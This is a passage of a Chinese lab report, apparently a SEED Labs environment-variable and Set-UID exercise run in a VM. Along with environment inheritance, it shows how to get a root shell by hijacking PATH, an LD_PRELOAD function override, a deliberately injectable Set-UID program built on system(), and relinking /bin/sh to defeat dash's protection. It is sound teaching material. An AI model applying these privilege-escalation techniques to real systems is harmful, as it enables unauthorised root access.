class="code"><pre><span class="line">gcc task<span class="number">2</span>.<span class="keyword">c</span> -o task<span class="number">2</span></span><br></pre></td></tr></table></figure><p>将结果保存为一个文档</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./task2 &gt; child.txt</span><br></pre></td></tr></table></figure><p>输出结果：</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132724663.png" alt="image-20251118151717274"></p><p>可见已经成功的将子进程的环境变量输出并保存。</p><ol start="4"><li>Step 2：输出父进程的环境变量</li></ol><p>（1）利用vi命令进行编辑，将子进程的printenv()注释掉，父进程printenv()取消注释。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printenv</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (environ[i] != <span class="literal">NULL</span>) </span><br><span class="line">   &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, environ[i]);</span><br><span class="line">    i++;</span><br><span class="line">   &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">pid_t</span> childPid;</span><br><span class="line">    <span class="keyword">switch</span>(childPid = fork())</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">/* child process */</span></span><br><span class="line">        <span class="comment">//printenv(); </span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printenv</span>(); <span class="comment">/* parent process */</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（2）重新编译源文件并运行，将结果保存到parent.txt文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc task2.c -o task2</span><br><span class="line">./task2 &gt; parent.txt</span><br></pre></td></tr></table></figure><p>成功地将父进程的环境变量输出并保存。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132725770.png" alt="image-20251118151920652"></p><ol start="5"><li>Step 3：使用diff命令查看父/子进程环境变量的区别</li></ol><p>使用diff进行父/子进程环境变量的对比：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">diff</span> child.txt parent.txt</span><br></pre></td></tr></table></figure><p>运行完后，没有输出结果，说明两次输出的环境变量完全相同，使用fork()函数创建的子进程的环境变量继承了父进程全部的环境变量；子进程与父进程共享环境变量。</p><p>注： 若有输出，是因为上面编译task2.c文件时，-o 后面的可执行文件名不同。</p><h4 id="（三）Task-3：环境变量与execve-函数">（三）Task 3：环境变量与execve()函数</h4><ol><li>实验目的及原理</li></ol><p>目的：通过execve执行一个新的程序时，环境变量如何变化？</p><p>原理：execve()函数通过系统调用执行新的程序，但不会创建子进程，原进程的文本、数据、bss以及堆栈被新的进程覆盖，原进程的环境变量会丢失。</p><p>示例代码task3.c</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> *argv[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">​    argv[<span class="number">0</span>] = <span class="string">&quot;/usr/bin/env&quot;</span>;</span><br><span class="line">​    argv[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="built_in">execve</span>(<span class="string">&quot;/usr/bin/env&quot;</span>, argv,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>Step 1：编译并运行示例代码</li></ol><p>发现输出为空：</p><ol start="3"><li>Step 2：修改函数参数，并编译运行</li></ol><p>将示例代码中的NULL改为environ，编译运行，此时输出了当前进程的环境变量：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">&quot;/usr/bin/env&quot;</span>, argv,environ)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132726628.png" alt="image-20251118153659098"></p><ol start="4"><li>Step 3：结论</li></ol><p>Step2与Step1进行对比，只是将exevce()函数的第三个参数由NULL改为environ，便输出了当前进程的环境变量，说明原进程将自己的环境变量通过environ变量传入exceve()函数的第三个参数，也就是第三个参数控制环境变量的传递，进而新的进程获取环境变量。</p><h4 id="（四）Task-4：环境变量与system-函数">（四）Task 4：环境变量与system()函数</h4><ol><li>实验目的及原理</li></ol><p>目的：通过system()执行新程序时，探究环境变量的变化</p><p>原理： system()使用fork创建子进程，子进程继承父进程的环境变量，子进程通过execl()来启动/bin/sh，并调用execve()函数，将环境变量数组传递给新程序；所以调用进程的环境变量可以被传递给新程序/bin/sh</p><p>示例代码task4.c</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/usr/bin/env&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.编译运行示例代码，验证上述原理</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132727391.png" alt="image-20251118153905335"></p><p>输出了当前进程的环境变量，整体流程为：system通过fork创建的子进程会继承父进程的环境变量，然后子进程执行execl将环境变量赋给新的程序。</p><p>（五）Task 5：环境变量与Set-UID程序</p><ol><li>实验目的与原理</li></ol><p>目的：环境变量是否由Set-UID程序的进程从用户的进程中继承</p><p>原理：Set-UID程序是指使文件对任何可以执行此文件的用户执行时以文件所有者的权限执行。Set-UID程序的行为由程序逻辑决定，但用户可以通过环境变量来影响Set-UID程序的行为。</p><p>示例代码task5.c</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (environ[i] != <span class="literal">NULL</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, environ[i]);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>Step 1：编译运行示例代码，打印当前进程的所有环境变量</li></ol><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132728183.png" alt="image-20251118154057689"></p><ol start="3"><li>Step 2：更改所有权为Root账户并使其成为一个Set-UID程序</li></ol><p>在这里可执行文件名为task5：</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132728889.png" alt="image-20251118154154173"></p><p>Chown命令将所有权更改为Root账户</p><p>Chmod命令使其成为一个Set-UID程序</p><p>我们通过task5和task4的属性对比，说明我们操作成功</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132729710.png" alt="image-20251118154231007"></p><ol start="4"><li>Step 3：在普通用户Shell中设置环境变量并运行Set-UID程序</li></ol><p>（1）设置PATH</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132730425.png" alt="image-20251118154342812"></p><p>（2）设置LD_LIBRARY_PATH</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132731080.png" alt="image-20251118154559661"></p><p>（3）设置ANY_NAME（以name为例）</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132731762.png" alt="image-20251118154641821"></p><p>（4）运行Set-UID程序，输出当前进程的环境变量</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132732585.png" alt="image-20251118154733412"></p><p>Shell会创建一个子进程，子进程执行Set-UID程序，我们发现在shell进程（父进程）中设置的PATH、name环境变量都已经进入了子进程的环境变量，但是我们发现在子进程的环境变量中找不到LD_LIBRARY_PATH环境变量。</p><p>解释：</p><ol><li><p>LD_LIBRARY_PATH用于指定查找共享库（动态链接库）时除了默认路径以外的其他路径；LD_LIBRARY_PATH可以被修改，从而加载攻击者的恶意库；为了使Set-UID程序更加安全，不受LD_LIBRARY_PATH环境变量的影响，运行时的链接器或加载器（<a href="http://ld.so">ld.so</a>）会忽略LD*环境变量；或许可以理解为链接器所拥有的一个保护机制：当执行程序的进程ID与拥有者的进程ID不一致时，链接器就会忽略掉LD_LIBRARY_PATH环境变量，所以在子进程的环境变量中找不到此环境变量。</p></li><li><p>LD_PRELOAD和LD_LIBRARY_PATH可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。</p></li><li><p>一方面，我们可以用此功能来使用自己的或是更好的函数，而另一方面，我们也可以向别人的程序注入程序，从而达到特定的目的。</p></li><li><p>为了保证Set-UID程序在LD_PRELOAD和LD_LIBRARY_PATH环境的操纵下是安全的，如果程序是一个Set-UID root程序，动态链接器就会忽略这些环境变量。</p></li></ol><h4 id="（六）Task-6：PATH环境变量与Set-UID程序">（六）Task 6：PATH环境变量与Set-UID程序</h4><ol><li>实验目的与原理</li></ol><p>目的：在Set-UID进程中调用system函数执行ls命令，需要通过修改环境变量执行我们自己设定的程序。</p><p>原理：system会调用shell，所以在Set-UID中执行system会有一定的安全问题，因为shell的执行可能会受到环境变量的影响，用户可以修改环境变量，恶意控制Set-UID程序的行为。</p><p>示例代码task6.c</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>使用命令将/bin/sh链接到zsh</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> /bin/sh</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">ln</span> -s /bin/zsh /bin/sh</span><br></pre></td></tr></table></figure><p>Ubuntu16.01上的dash shell有一个保护机制，防止自身在Set-UID进程中执行，如果dash shell检测到自己在Set-UID进程中执行，会立即将有效的用户ID更改为进程的实际用户ID，因为我们要在Set-UID进程中执行system函数会调用shell，上述的保护机制会防止我们的攻击，所以需要更改shell。</p><ol start="3"><li><p>修改环境变量PATH，编译示例代码</p></li><li><p>修改所有者为Root，并将其设置为Set-UID程序</p></li></ol><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132733279.png" alt="image-20251118155135157"></p><ol start="5"><li>运行上述编译好的task6</li></ol><p>发现执行的是ls命令：</p><ol start="6"><li>修改环境变量，使得system调用的shell执行自己设定的程序</li></ol><p>System函数中执行的是ls命令，我们的目的是想要system函数执行的ls命令为我们自己设定的程序，所以我们需要将我们自己设定的程序命名为ls，并且将我们自己设定的程序的路径放入PATH环境变量的开头，因为shell程序执行命令时，如果不提供命令的具体路径，shell程序会按照顺序来查找PATH的每一个目录下是否有同名的可执行文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;命名为ls&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    printf(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>设定的程序是输出Hello world！，我们将其编译并命名为ls，使用pwd查看编译好的ls文件的路径，并将其添加到PATH路径的开头，然后再执行task6：</p><p>然后执行./task6文件，也就是我们的Set-UID程序。发现成功输出Hello world！，task6中system执行的是ls命令，但实际上执行了我们自己设定的程序。</p><ol start="7"><li>运行task6获得一个具有root权限的shell</li></ol><p>将/bin/sh 拷贝为当前目录下的文件ls</p><p>将当前目录/home/seed添加到环境变量PATH中</p><p>这里的提示只是说日期无法正常显示，没有其他影响。</p><p>然后执行exec就可以获得一个具有root权限的shell：</p><p>这里我们可以看到命令行已经变成了 ‘#’，也就是root权限的标志。</p><p>解释：因为当前路径下的 ls 文件是我们由/bin/sh复制的，所以执行之后会出现shell，而且因为执行Set-UID程序时，会临时获得root权限，所以是root权限的shell。</p><ol start="8"><li>恢复环境变量：采用重启虚拟机的方法</li></ol><p>（七）Task 7：LD_PRELOAD环境变量与Set-UID程序</p><ol><li>目的与原理</li></ol><p>目的： 设置LD_PRELOAD环境变量，观察一个程序在不同场景中的不同行为表现</p><p>原理：许多UNIX系统允许“预加载”共享库，可以通过设置LD_PRELOAD环境变量来指定一些库，这些库会在其他库之前加载，</p><p>但是动态链接器会有一些保护机制，子进程继承环境变量可能会受阻</p><ol start="2"><li>Step 1：构建一个动态链接库</li></ol><p>（1）创建mylib.c文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sleep</span> <span class="params">(<span class="type">int</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;     <span class="comment">/* If this is invoked by a privileged program,</span></span><br><span class="line"><span class="comment">    you can do damages here! */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I am not sleeping!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（2）编译上述程序</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~$ gcc -fPIC -<span class="selector-tag">g</span> -c mylib<span class="selector-class">.c</span></span><br><span class="line">~$ gcc -shared -o libmylib<span class="selector-class">.so</span>.<span class="number">1.0</span>.<span class="number">1</span> mylib<span class="selector-class">.o</span> -lc</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>（3）设置LD_PRELOAD环境变量</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seed@VM:~$ <span class="built_in">export</span> <span class="attribute">LD_PRELOAD</span>=./libmylib.so.1.0.1</span><br></pre></td></tr></table></figure><p>（4）编译myprog.c文件，并放在与libmylib.so.1.0.1相同目录下</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* myprog.c */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">main</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132733996.png" alt="image-20251124153130104"></p><ol start="3"><li>Step 2：在以下四个不同场景中运行myprog可执行文件</li></ol><p>（1）普通用户下执行myprog</p><p>会执行我们设定的库中的sleep函数，输出字符串，而不会执行原来的sleep函数让它sleep 1秒。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132734721.png" alt="image-20251124153156790"></p><p>（2）将myprog设置为Set-UID根程序，在普通用户下执行</p><p>正常执行程序，sleep 1秒，然后退出程序。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132735511.png" alt="image-20251124153316347"></p><p>（3）将myprog设置为Set-UID根程序，并在root下设置LD_PRELOAD环境变量并运行。</p><p>首先我们需要登入root账户，并设置环境变量</p><p>① 以root用户运行</p><p>会执行我们设定的库中的sleep函数，而不会执行原来的sleep函数让它sleep 1秒。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132736523.png" alt="image-20251124153446340"></p><p>② 以普通用户运行</p><p>退出root账户，执行myprog程序。</p><p>发现正常执行程序，sleep 1秒，然后退出程序。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132737640.png" alt="image-20251124153519686"></p><p>（4）将myprog设置为Set-UID user1程序，并在seed用户下设置环境变量。</p><p>①在root用户下，建立新的用户user1</p><p>②设置myprog和环境变量</p><p>可见myprog已经设置为Set-UID user1程序，且在seed用户下设置了环境变量。</p><p>③在seed用户下运行Set-UID程序</p><p>发现正常执行程序，sleep 1秒，然后退出程序。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132739064.png" alt="image-20251124153749875"></p><ol start="4"><li>Step 3：设计实验并解释上述现象</li></ol><p>（1）猜想：myprog进程会从用户进程中继承环境变量，但是由于动态链接器的一些保护机制，不会继承LD_PRELOAD环境变量。</p><p>（2）设计实验：分别在上述四种场景中，将用户进程和子进程的环境变量输出为文件，并进行对比，找出不同（重点关注LD_PRELOAD），在整个实验过程中，seed用户下始终设置LD_PRELOAD环境变量。</p><p>（3）实验代码：</p><p>命名为test.c，编译为test可执行文件</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi <span class="keyword">test</span>.c</span><br><span class="line">gcc <span class="keyword">test</span>.c -o <span class="keyword">test</span></span><br></pre></td></tr></table></figure><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printenv</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (environ[i] != <span class="literal">NULL</span>) </span><br><span class="line">   &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, environ[i]);</span><br><span class="line">    i++;</span><br><span class="line">   &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">pid_t</span> childPid;</span><br><span class="line">    <span class="keyword">switch</span>(childPid = fork())</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">/* child process */</span></span><br><span class="line">        <span class="built_in">printenv</span>(); </span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">//printenv(); /* parent process */</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（4）实验过程</p><p>① 场景一：普通用户(seed)下执行test程序，seed用户下修改环境变量</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132740246.png" alt="image-20251124155501495"></p><p>这里可见test程序与用户进程的环境变量一致，然后分别查看二者的环境变量中是否有LD_PRELOAD变量。</p><p>用户进程的环境变量：</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132740969.png" alt="image-20251124155715545"></p><p>test中子进程的环境变量：</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132741592.png" alt="image-20251124155653095"></p><p>结论：场景一下，子进程继承了用户进程的LD_PRELOAD环境变量。</p><p>（八）Task 8：使用system与execve调用外部程序</p><ol><li>实验目的与原理：</li></ol><p>目的：system()与execve()在Set-UID根程序下执行，观察其对系统文件的危害行为</p><p>原理：system()与execve()在执行时的区别</p><p>示例代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> *v[<span class="number">3</span>];</span><br><span class="line">    <span class="type">char</span> *command;</span><br><span class="line">    <span class="keyword">if</span>(argc &lt; <span class="number">2</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Please type a file name.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = <span class="string">&quot;/bin/cat&quot;</span>; v[<span class="number">1</span>] = argv[<span class="number">1</span>]; v[<span class="number">2</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    command = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(v[<span class="number">0</span>]) + <span class="built_in">strlen</span>(v[<span class="number">1</span>]) + <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(command, <span class="string">&quot;%s %s&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">// Use only one of the followings.</span></span><br><span class="line">    <span class="built_in">system</span>(command);</span><br><span class="line">    <span class="comment">// execve(v[0], v, NULL);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察代码，当我们在命令行执行此程序时，会输出command命令，command命令由v[0] + v[1]组成也就是进行了字符串的拼接，而v[1]是通过我们在命令行的输入来决定的，所以我们可以控制我们的输入来达到对命令的控制。</p><p>Argc 统计发送给main函数的参数个数，Argv为字符串数组。V[1]是输入的第一个字符串。</p><ol start="2"><li>实验说明</li></ol><p>Bob拥有的权限：能够读取所有文件，但是不应该能够修改任何文件</p><p>system() 实际调用/bin/sh，然后在 shell 环境中运行该命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> /bin/sh</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">ln</span> -s /bin/zsh /bin/sh</span><br></pre></td></tr></table></figure><ol start="3"><li>Step 1：使用system()调用外部程序，删除根用户拥有的文件</li></ol><p>（1）编译并设置为Set-UID根程序</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132742412.png" alt="image-20251124160118757"></p><p>（2）在root用户下创建一个home1目录，在该目录下创建一个名为为hello.c的文件，并在seed下删除</p><p>一开始没有创建home1目录，直接创建了hello.c文件：</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132743253.png" alt="image-20251124164103424"></p><p>这里我们发现在seed用户下竟然可以删除写保护的文件，经过查资料，发现还需要看上一级目录的权限，所以先在root下创建一个home1目录，在此目录下创建hello.c文件，然后再seed下删除hello.c，此时发现权限不够：</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211132744036.png" 